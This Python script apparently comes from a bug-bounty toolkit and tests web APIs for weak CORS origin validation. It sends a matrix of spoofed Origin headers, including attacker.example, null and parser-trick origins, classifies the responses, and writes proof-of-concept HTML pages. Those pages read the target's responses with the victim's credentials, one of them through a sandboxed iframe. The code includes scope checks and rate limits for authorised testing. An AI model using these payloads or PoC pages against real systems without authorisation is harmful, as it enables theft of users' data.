#!/usr/bin/env python3
"""Probe CORS origin validation with an Origin matrix and preflights.

For each URL: a baseline without Origin, then one GET per Origin variant
(arbitrary, null, subdomain, scheme/port, suffix/prefix, regex, parser and
encoding tricks, Unicode, dev and third-party origins), then OPTIONS
preflights. Each response is classified by ACAO, ACAC, and Vary. Optional:
POST method switch (--post) and a PoC HTML for the best finding (--poc-out).

Safety:
  - Every unique host must be the target or its subdomain and pass
    scripts/scope_check.sh.
  - Only GET and OPTIONS by default (POST only with --post, empty body).
  - Max 80 requests per URL, delay 0.3 s by default. Use your own session.

Example:
  cors_probe.py --target example.com --workspace ~/Documents/bugbounty \
     --url https://api.example.com/v1/me --cookie 'session=OWN' \
     --out artifacts/example.com/cors.json --poc-out artifacts/example.com/cors_pocs/poc.html
  cors_probe.py --target example.com --urls alive.txt --quick
"""
from __future__ import annotations

import argparse
import http.client
import json
import os
import ssl
import subprocess
import sys
import time
from urllib.parse import urlsplit

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
MAX_PER_URL = 80
SECOND_LEVEL = {"co", "com", "org", "net", "ac", "gov", "edu", "or", "ne", "go"}
THIRD_PARTY = [
    "https://cors-test.github.io", "https://cors-test.s3.amazonaws.com", "https://cors-test.herokuapp.com",
    "https://cors-test.vercel.app", "https://cors-test.netlify.app", "https://d111111abcdef8.cloudfront.net",
    "https://codepen.io", "https://jsfiddle.net", "https://cors-test.firebaseapp.com",
    "https://cors-test.azurewebsites.net", "https://cors-test.web.app", "https://cors-test.pages.dev",
]
# reachability: how an attacker gets a browser to send this origin
REACH = {
    "arbitrary": "attacker registers the domain (directly exploitable)",
    "null": "sandboxed iframe (directly exploitable)",
    "subdomain": "needs XSS, takeover, or hosted content on a subdomain",
    "target": "target's own origin (expected, unless scheme/port is weak)",
    "http": "needs a network attacker (TLS break)",
    "parser": "browser-dependent hostname characters (check Safari/Chrome/Firefox)",
    "dev": "local or app origin (usually needs local access or a mobile/desktop app)",
    "thirdparty": "exploitable if you can host a page on that service",
    "invalid": "not sendable by a browser; reflection shows no validation",
}


def run_scope_check(host: str, workspace: str | None, program: str | None = None) -> None:
    cmd = ["bash", SCOPE, host, workspace or "", program or host]
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        sys.exit(res.returncode or 3)


def registrable(host: str) -> str:
    parts = host.split(".")
    if len(parts) >= 3 and len(parts[-1]) == 2 and parts[-2] in SECOND_LEVEL:
        return ".".join(parts[-3:])
    return ".".join(parts[-2:])


def origin_matrix(T: str, host: str, A: str, quick: bool) -> list[tuple[str, str, str, str]]:
    """(id, category, origin, note)"""
    label, _, tld = T.partition(".")
    o = [
        ("CORS-B-001", "arbitrary", f"https://{A}", "arbitrary origin"),
        ("CORS-B-002", "null", "null", "null origin"),
        ("CORS-B-003", "subdomain", f"https://{A.split('.')[0]}.{T}", "attacker.target"),
        ("CORS-B-004", "arbitrary", f"https://attacker{T}", "suffix without dot"),
        ("CORS-B-006", "arbitrary", f"https://{T}.{A}", "target as prefix"),
        ("CORS-004", "target", f"https://{host}", "own origin"),
        ("CORS-B-010", "http", f"http://{host}", "scheme downgrade"),
        ("CORS-011", "subdomain", f"https://doesnotexist-cors-{int(time.time()) % 100000}.{T}", "random subdomain"),
    ]
    if quick:
        return o
    o += [
        ("CORS-B-005", "arbitrary", f"https://sub.attacker{T}", "sub of suffix"),
        ("CORS-B-007", "arbitrary", f"https://{T}puter", "expected-host.computer style"),
        ("CORS-B-008", "invalid", f"https://{A}/{T}", "path in origin"),
        ("CORS-B-009", "invalid", f"https://{A}?{T}", "query in origin"),
        ("CORS-004", "target", f"https://{T}", "apex"),
        ("CORS-004", "target", f"https://www.{T}", "www"),
        ("CORS-B-011", "target", f"https://{host}:8443", "other port"),
        ("CORS-B-012", "target", f"https://{host.upper()}", "uppercase"),
        ("CORS-B-013", "target", f"https://{host}.", "trailing dot"),
        ("CORS-B-014", "arbitrary", f"https://www{label}.{tld}", "unescaped dot (wwwXtarget)"),
        ("CORS-B-014", "arbitrary", f"https://{label}x{tld}", "unescaped dot in target"),
        ("CORS-B-015", "arbitrary", f"https://{T}-{A}", "hyphen join"),
        ("CORS-B-016", "arbitrary", f"https://not{T}", "endsWith without dot"),
        ("CORS-B-017", "dev", "http://localhost", "localhost"),
        ("CORS-B-017", "dev", "http://localhost:3000", "localhost dev port"),
        ("CORS-B-017", "dev", "http://127.0.0.1", "loopback"),
        ("CORS-B-018", "dev", "file://", "file origin"),
        ("CORS-B-018", "dev", "capacitor://localhost", "capacitor app"),
        ("CORS-B-018", "dev", "ionic://localhost", "ionic app"),
        ("CORS-B-019", "invalid", "*", "literal wildcard"),
        ("CORS-B-019", "invalid", "x", "garbage"),
        ("CORS-B-020", "parser", f"https://{T}`.{A}", "Safari backtick"),
        ("CORS-B-020", "parser", f"https://{T}%60.{A}", "encoded backtick"),
        ("CORS-B-021", "parser", f"https://{T}_.{A}", "underscore"),
    ]
    for ch in "!$&'()*+,;=-~{}|":
        o.append(("CORS-B-022", "parser", f"https://{T}{ch}.{A}", f"special char {ch}"))
    o += [
        ("CORS-B-023", "invalid", f"https://sub.attacker {T}", "space"),
        ("CORS-B-023", "invalid", f"https://sub.attacker%{T}", "percent"),
        ("CORS-B-024", "invalid", f"https://foo@{A}:80@{T}", "double userinfo"),
        ("CORS-B-025", "invalid", f"https://foo@{A}%20@{T}", "encoded space userinfo"),
        ("CORS-B-026", "invalid", f"https://{A}\t{T}", "tab"),
        ("CORS-B-026", "invalid", f"https://{A}%09{T}", "encoded tab"),
        ("CORS-B-027", "invalid", f"https://{A}\\@{T}", "backslash"),
        ("CORS-B-031", "parser", f"https://ß.{A}", "sharp s"),
        ("CORS-B-031", "parser", f"https://{label}．{tld}", "fullwidth dot"),
        ("CORS-B-033", "invalid", f"https://{T}%2e{A}", "encoded dot"),
        ("CORS-B-034", "invalid", f"https://{host}, https://{A}", "two origins"),
        ("CORS-B-035", "invalid", f"https://{T}@{A}", "userinfo (browser host is attacker)"),
    ]
    o += [("CORS-B-036", "thirdparty", u, "third-party host") for u in THIRD_PARTY]
    return o


def request(url: str, method: str, headers: dict, insecure: bool, timeout: float) -> tuple[int, dict]:
    p = urlsplit(url)
    path = (p.path or "/") + (("?" + p.query) if p.query else "")
    if p.scheme == "https":
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
        conn = http.client.HTTPSConnection(p.hostname, p.port or 443, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(p.hostname, p.port or 80, timeout=timeout)
    conn.putrequest(method, path, skip_accept_encoding=True)
    for k, v in headers.items():
        conn.putheader(k, v.encode("utf-8") if isinstance(v, str) else v)
    if method == "POST":
        conn.putheader("Content-Length", "0")
    conn.endheaders()
    resp = conn.getresponse()
    resp.read(65536)
    hdrs = {k.lower(): v for k, v in resp.getheaders()}
    conn.close()
    return resp.status, hdrs


def classify(origin: str, h: dict) -> dict:
    acao = h.get("access-control-allow-origin")
    acac = (h.get("access-control-allow-credentials") or "").strip().lower() == "true"
    vary = "origin" in (h.get("vary") or "").lower()
    reflected = acao is not None and acao.strip().lower() == origin.strip().lower()
    return {
        "acao": acao, "acac": acac, "vary_origin": vary,
        "reflected": reflected, "wildcard": acao == "*",
        "readable_with_credentials": reflected and acac,
        "acam": h.get("access-control-allow-methods"), "acah": h.get("access-control-allow-headers"),
        "aceh": h.get("access-control-expose-headers"), "max_age": h.get("access-control-max-age"),
    }


POC_FETCH = """<html><body><h2>CORS PoC - {url}</h2><p>Origin category: {cat}</p><pre id="out">loading...</pre>
<script>
fetch("{url}", {{credentials: "include"}})
  .then(r => r.text()).then(t => document.getElementById("out").textContent = t)
  .catch(e => document.getElementById("out").textContent = "blocked: " + e);
</script></body></html>
"""
POC_NULL = """<html><body><h2>CORS null-origin PoC - {url}</h2><pre id="out">loading...</pre>
<iframe style="display:none" sandbox="allow-scripts" srcdoc="<script>
fetch('{url}', {{credentials: 'include'}}).then(r => r.text()).then(t => parent.postMessage(t, '*'))
  .catch(e => parent.postMessage('blocked: ' + e, '*'));
</script>"></iframe>
<script>window.addEventListener('message', e => document.getElementById('out').textContent = e.data);</script>
</body></html>
"""


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--workspace")
    ap.add_argument("--url", action="append", default=[])
    ap.add_argument("--urls", help="file with URLs, one per line")
    ap.add_argument("--domain", help="registrable domain to build origins from (default: derived from host)")
    ap.add_argument("--attacker", default="attacker.example", help="attacker domain used in origins")
    ap.add_argument("--cookie", help="own session cookie value")
    ap.add_argument("--header", action="append", default=[], help="extra header 'Name: value' (own auth)")
    ap.add_argument("--quick", action="store_true", help="only the 8 core origins")
    ap.add_argument("--post", action="store_true", help="also send POST (empty body) with reflected origins")
    ap.add_argument("--delay", type=float, default=0.3)
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--out")
    ap.add_argument("--poc-out", help="write a PoC HTML for the best finding")
    args = ap.parse_args()

    urls = list(args.url)
    if args.urls:
        urls += [l.strip() for l in open(args.urls, encoding="utf-8") if l.strip() and not l.startswith("#")]
    urls = [u if "://" in u else "https://" + u for u in urls]
    if not urls:
        sys.exit("give --url or --urls")
    target = args.target.lower()
    checked = set()
    for u in urls:
        h = (urlsplit(u).hostname or "").lower()
        if not (h == target or h.endswith("." + target)):
            sys.exit(f"{u}: host {h} is not {target} or a subdomain of it")
        if h not in checked:
            run_scope_check(h, args.workspace, args.target.lower())
            checked.add(h)

    base_headers = {"User-Agent": "Mozilla/5.0 cors-audit", "Accept": "*/*"}
    if args.cookie:
        base_headers["Cookie"] = args.cookie
    for hv in args.header:
        k, _, v = hv.partition(":")
        base_headers[k.strip()] = v.strip()

    report = {"target": target, "urls": []}
    best = None
    rank = {"arbitrary": 0, "null": 1, "thirdparty": 2, "parser": 3, "subdomain": 4, "http": 5, "dev": 6, "invalid": 7, "target": 9}
    for url in urls:
        host = urlsplit(url).hostname.lower()
        T = args.domain or registrable(host)
        entry = {"url": url, "domain": T, "results": [], "preflight": [], "post": []}
        sent = 0

        def go(method, extra):
            nonlocal sent
            if sent >= MAX_PER_URL:
                return None
            if sent:
                time.sleep(args.delay)
            sent += 1
            try:
                return request(url, method, {**base_headers, **extra}, args.insecure, args.timeout)
            except Exception as e:
                return ("error", str(e))

        r = go("GET", {})
        if r and r[0] != "error":
            entry["baseline"] = {"status": r[0], "acao": r[1].get("access-control-allow-origin"),
                                 "acac": r[1].get("access-control-allow-credentials")}
        accepted = []
        for cid, cat, origin, note in origin_matrix(T, host, args.attacker, args.quick):
            r = go("GET", {"Origin": origin})
            if r is None:
                break
            if r[0] == "error":
                entry["results"].append({"id": cid, "origin": origin, "error": r[1]})
                continue
            c = classify(origin, r[1])
            rec = {"id": cid, "category": cat, "origin": origin, "note": note, "status": r[0], **c}
            if c["reflected"] or c["wildcard"]:
                rec["reachability"] = REACH[cat]
            entry["results"].append(rec)
            if c["reflected"]:
                accepted.append(rec)
                if c["acac"] and cat != "target" and (best is None or rank[cat] < rank[best[1]["category"]]):
                    best = (url, rec)
        pf_origins = [f"https://{args.attacker}"] + [a["origin"] for a in accepted if a["category"] != "target"][:2]
        for origin in dict.fromkeys(pf_origins):
            r = go("OPTIONS", {"Origin": origin, "Access-Control-Request-Method": "PUT",
                               "Access-Control-Request-Headers": "authorization,x-custom-header,content-type"})
            if r and r[0] != "error":
                entry["preflight"].append({"origin": origin, "status": r[0], **classify(origin, r[1])})
        if args.post:
            for a in accepted[:3]:
                r = go("POST", {"Origin": a["origin"]})
                if r and r[0] != "error":
                    entry["post"].append({"origin": a["origin"], "status": r[0], **classify(a["origin"], r[1])})
        entry["summary"] = {
            "requests": sent,
            "reflected_with_credentials": sorted({a["origin"] for a in accepted if a["acac"] and a["category"] != "target"}),
            "reflected_without_credentials": sorted({a["origin"] for a in accepted if not a["acac"] and a["category"] != "target"}),
            "wildcard": any(x.get("wildcard") for x in entry["results"]),
            "dynamic_acao_without_vary": any(x.get("reflected") and not x.get("vary_origin") for x in entry["results"]),
        }
        report["urls"].append(entry)

    if best:
        report["best_finding"] = {"url": best[0], **{k: best[1][k] for k in ("id", "category", "origin", "reachability")}}
        if args.poc_out:
            tpl = POC_NULL if best[1]["category"] == "null" else POC_FETCH
            os.makedirs(os.path.dirname(os.path.abspath(args.poc_out)), exist_ok=True)
            open(args.poc_out, "w", encoding="utf-8").write(tpl.format(url=best[0], cat=best[1]["category"]))
            report["best_finding"]["poc"] = args.poc_out
    report["note"] = ("Reflection is a lead. Confirm in a real browser with your own victim session; "
                      "SameSite cookies and third-party cookie blocking can prevent exploitation.")
    text = json.dumps(report, indent=2, ensure_ascii=False)
    if args.out:
        os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
        open(args.out, "w", encoding="utf-8").write(text)
    for e in report["urls"]:
        s = e["summary"]
        print(f"{e['url']}: {s['requests']} requests")
        print(f"  reflected + credentials: {s['reflected_with_credentials'] or 'none'}")
        print(f"  reflected, no credentials: {s['reflected_without_credentials'] or 'none'}")
        print(f"  wildcard: {s['wildcard']}  dynamic ACAO without Vary: {s['dynamic_acao_without_vary']}")
        for p in e["preflight"]:
            print(f"  preflight {p['origin']}: ACAO={p['acao']} methods={p['acam']} headers={p['acah']}")
    if best:
        print(f"best finding: {report['best_finding']}")
    if args.out:
        print(f"full results: {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
